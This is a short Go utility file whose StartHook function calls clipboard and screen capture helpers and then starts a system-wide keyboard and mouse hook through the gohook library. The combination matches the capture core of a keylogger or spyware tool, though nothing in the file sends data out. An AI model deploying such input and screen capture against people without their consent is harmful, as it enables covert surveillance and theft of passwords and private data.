package utils

import hook "github.com/robotn/gohook"

func StartHook() {
	GetClipBoard()
	GetScreen()
	s := hook.Start()
	<-hook.Process(s)
}
